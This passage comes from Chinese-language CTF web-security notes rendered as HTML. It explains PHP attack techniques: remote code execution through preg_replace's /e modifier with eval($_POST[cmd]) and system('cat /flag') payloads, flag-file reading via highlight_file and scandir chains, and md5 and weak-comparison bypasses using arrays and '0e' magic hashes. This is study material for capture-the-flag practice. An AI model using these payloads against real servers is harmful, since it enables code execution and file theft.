+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">preg_replace&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">mixed&lt;/span> &lt;span class="nv">$pattern&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="nx">mixed&lt;/span> &lt;span class="nv">$replacement&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="nx">mixed&lt;/span> &lt;span class="nv">$subject&lt;/span> &lt;span class="p">[,&lt;/span> &lt;span class="nx">int&lt;/span> &lt;span class="nv">$limit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">[,&lt;/span> &lt;span class="nx">int&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nv">$count&lt;/span> &lt;span class="p">]]&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。&lt;/p>
+&lt;ul>
+&lt;li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。&lt;/li>
+&lt;li>$replacement: 用于替换的字符串或字符串数组。&lt;/li>
+&lt;li>$subject: 要搜索替换的目标字符串或字符串数组。&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="e-模式">/e 模式
+&lt;/h3>&lt;p>&lt;strong>preg_replace&lt;/strong> &lt;strong>/e&lt;/strong> 模式下存在 RCE，php 7 被删除&lt;/p>
+&lt;h4 id="实战">实战
+&lt;/h4>&lt;p>注入环境：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;/(&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$key&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;)/ei&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;strtolower(&amp;#34;\\1&amp;#34;)&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$value&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>key、value 是 GET 传入的键值对&lt;/li>
+&lt;li>&lt;code>/ei&lt;/code> 表示替换内容当作 php 执行&lt;/li>
+&lt;/ul>
+&lt;p>payload1：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> ?\S*=${phpinfo()}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>\S&lt;/code> 利用 GET 上传的非法字符解析原理，解析成 &lt;code>.&lt;/code>&lt;/li>
+&lt;li>&lt;code>.*&lt;/code> 是 key，&lt;code>${phpinfo()}&lt;/code> 是 value&lt;/li>
+&lt;li>&lt;code>.*&lt;/code> 贪婪匹配任意字符任意次，匹配 &lt;code>${phpinfo()}&lt;/code>&lt;/li>
+&lt;li>php 执行 &lt;code>strtolower(&amp;quot;{${phpinfo()}}&amp;quot;)&lt;/code>&lt;/li>
+&lt;li>原理如下&lt;/li>
+&lt;/ul>
+&lt;p>payload2：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">\S&lt;/span>&lt;span class="o">*=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">])}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 再 POST 一个参数 cmd=system(&amp;#34;cat /flag&amp;#34;);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 或者解析一个题目给出的可以利用的函数
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// function getFlag(){
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// @eval($_GET[&amp;#39;cmd&amp;#39;]);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// }
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="nx">\S&lt;/span>&lt;span class="o">*=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">getFlag&lt;/span>&lt;span class="p">()}&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="原理">原理
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">());&lt;/span> &lt;span class="c1">// 结果：布尔 true
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">()));&lt;/span>&lt;span class="c1">// 结果：字符串 &amp;#39;1&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 先执行 phpinfo 得到返回值是 1，再 strtolower(&amp;#34;1&amp;#34;) 返回值是 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/(.*)/ie&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;{${phpinfo()}}&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="c1">// 结果：字符串&amp;#39;11&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 先解析 {${phpinfo()}}，其中 phpinfo 返回 1， 解析得 {$1}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// var_dump(preg_replace(&amp;#39;/(.*)/i&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;任意字符&amp;#39;)); 返回 11
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/(.*)/ie&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;strtolower(&amp;#34;\\1&amp;#34;)&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;{${phpinfo()}}&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="c1">// 结果：空字符串&amp;#39;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">var_dump&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/(.*)/ie&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;strtolower(&amp;#34;{${phpinfo()}}&amp;#34;)&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;{${phpinfo()}}&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="c1">// 结果：空字符串&amp;#39;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 这里的&amp;#39;strtolower(&amp;#34;{${phpinfo()}}&amp;#34;)&amp;#39;执行后相当于 strtolower(&amp;#34;{${1}}&amp;#34;) 又相当于 strtolower(&amp;#34;{null}&amp;#34;) 又相当于 &amp;#39;&amp;#39; 空字符串
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="php-正则反斜杠过滤问题">php 正则反斜杠过滤问题
+&lt;/h3>&lt;p>&lt;code>preg_match&lt;/code> 匹配反斜杠需要四个反斜杠：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/&lt;/span>&lt;span class="se">\\\\&lt;/span>&lt;span class="s2">/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$str1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// preg_match(&amp;#34;/\\/&amp;#34;, $str1) 无效
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>原理：先由 php 解析器解析成&lt;code>\\&lt;/code> ，再由正则匹配解析成&lt;code>\&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>再看一个特殊的：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">preg_match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">|&lt;/span>&lt;span class="se">\\\\&lt;/span>&lt;span class="s2">/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$str2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>这个匹配的是 &lt;code>|\&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>先由 php 解析器解析为 &lt;code>\|\\&lt;/code> ，再由正则解析为 `|\&lt;/p>
+&lt;hr>
+&lt;h1 id="技巧">技巧
+&lt;/h1>&lt;h2 id="读取文件新姿势">读取文件新姿势
+&lt;/h2>&lt;h3 id="highlight-高亮输出">highlight 高亮输出
+&lt;/h3>&lt;p>highlight 高亮输出 + glob 搜索并返回第一个元素&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;highlight_file(glob(&amp;#34;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="s2">&amp;#34;)[0]);&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>highlight_file 是 php 的函数&lt;/li>
+&lt;/ul>
+&lt;h3 id="无特殊字符的纯函数读取">无特殊字符的纯函数读取
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">scandir&lt;span class="o">(&lt;/span>current&lt;span class="o">(&lt;/span>localeconv&lt;span class="o">()))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># current() 返回数组中当前元素的值&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># scandir()就是列出目录中的文件和目录&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 打印&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print_r&lt;span class="o">()&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">print_r&lt;span class="o">(&lt;/span>scandir&lt;span class="o">(&lt;/span>current&lt;span class="o">(&lt;/span>localeconv&lt;span class="o">())))&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看调试信息&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 定位&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># array_reverse() 反转数组&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># next() 指向下一个 (第二个)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">next&lt;span class="o">(&lt;/span>array_reverse&lt;span class="o">(&lt;/span>scandir&lt;span class="o">(&lt;/span>current&lt;span class="o">(&lt;/span>localeconv&lt;span class="o">()))))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 此处指倒数第二个数组元素&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># highlight 读取文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">highlight_file&lt;span class="o">(&lt;/span>next&lt;span class="o">(&lt;/span>array_reverse&lt;span class="o">(&lt;/span>scandir&lt;span class="o">(&lt;/span>current&lt;span class="o">(&lt;/span>localeconv&lt;span class="o">())))))&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="弱比较">弱比较
+&lt;/h2>&lt;p>&lt;code>==&lt;/code> 是PHP弱比较逻辑运算符&lt;/p>
+&lt;h3 id="整数-和-字符串-的弱比较">整数 和 字符串 的弱比较
+&lt;/h3>&lt;p>尝试将字符串转换为整数，规则同 &lt;code>intval()&lt;/code>，再比大小&lt;/p>
+&lt;ul>
+&lt;li>123a == 123&lt;/li>
+&lt;li>例如，payload为123a可以绕过 is_numeric函数&lt;/li>
+&lt;/ul>
+&lt;h3 id="弱比较和强比较的区别">弱比较和强比较的区别
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">== 和 != 左右两边数据类型不同时，会将他们转化成同一格式进行比较。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">=== 和 !== 左右两边数据类型不同时，则返回false
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="科学记数法">科学记数法
+&lt;/h2>&lt;ul>
+&lt;li>用于限制数字长度的题&lt;/li>
+&lt;/ul>
+&lt;p>1000000000 = 1e9&lt;/p>
+&lt;hr>
+&lt;h2 id="绕过md5">绕过md5
+&lt;/h2>&lt;h3 id="数组绕过">数组绕过
+&lt;/h3>&lt;p>md5无法比较数组，对于数组，md5会返回NULL，所以相等，可以绕过比较&lt;/p>
+&lt;ul>
+&lt;li>返回null，在强比较里面&lt;code>null=null&lt;/code>也为 True，所以也可以绕过强比较&lt;/li>
+&lt;/ul>
+&lt;h4 id="实例">实例
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;!--&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nv">$b&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$b&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//flag
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">--&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?a[]=1&amp;amp;b[]=2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># md5($a) == md5($b) returns true
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="科学计数绕过">科学计数绕过
+&lt;/h3>&lt;ul>
+&lt;li>只能绕过弱比较&lt;code>==&lt;/code>，不能绕过&lt;code>===&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>原理：在 php 中，当字符串以0e开头时，会被 php 识别成==科学计数法==，结果均为0，因此在比较两个以 &lt;code>0e&lt;/code> 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。&lt;/p>
+&lt;ul>
+&lt;li>所以关键在于找到md5值为0e开头的字符串&lt;/li>
+&lt;/ul>
+&lt;p>常用 MD5 值以 0e 开头的字符串：&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>字符串&lt;/th>
+&lt;th>MD5 值&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>QNKCDZO&lt;/td>
+&lt;td>0e830400451993494058024219903391&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>s878926199a&lt;/td>
+&lt;td>0e545993274517709034328855841020&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>s155964671a&lt;/td>
+&lt;td>0e342768416822451524974117254469&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>s214587387a&lt;/td>
+&lt;td>0e342768416822451524974117254469&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>0e215962017&lt;/td>
+&lt;td>0e291242476940776845150308577824&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;ul>
+&lt;li>最后一个很特殊，&lt;strong>原字符串和 md5 值都是 0e 开头&lt;/strong>，可以绕过 &lt;code>md($a) == $a&lt;/code> 的情况&lt;/li>
+&lt;li>更多： &lt;a class="link" href="https://github.com/spaze/hashes" target="_blank" rel="noopener"
+>GitHub - spaze/hashes: Magic hashes – PHP hash &amp;ldquo;collisions&amp;rdquo;&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?a=QNKCDZO&amp;amp;b=s878926199a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># md5($a) == md5($b) returns true
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="md5-碰撞">md5 碰撞
+&lt;/h3>&lt;ul>
+&lt;li>&lt;a class="link" href="../%e5%b7%a5%e5%85%b7/fastcoll.md" >fastcoll&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>找到两个真实的 md5 值一样的字符串绕过对字符串 md5 的强等于条件。&lt;/p>
+&lt;p>最终找到的两个 md5 值一样的字符串一般是乱码，需要经过 urlencode 再POST给服务器。&lt;/p>
+&lt;ul>
+&lt;li>hackbar 不能直接 post 经过 URL编码之后的数据，必须通过 burp 发包&lt;/li>
+&lt;li>hackbar 直接输入的是原始数据，会在发包的时候经过一次 URL 编码，所以直接在 hackbar 输入 URL 编码之后的数据会再次被 URL 编码，导致出错&lt;/li>
+&lt;/ul>
+&lt;p>收集：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
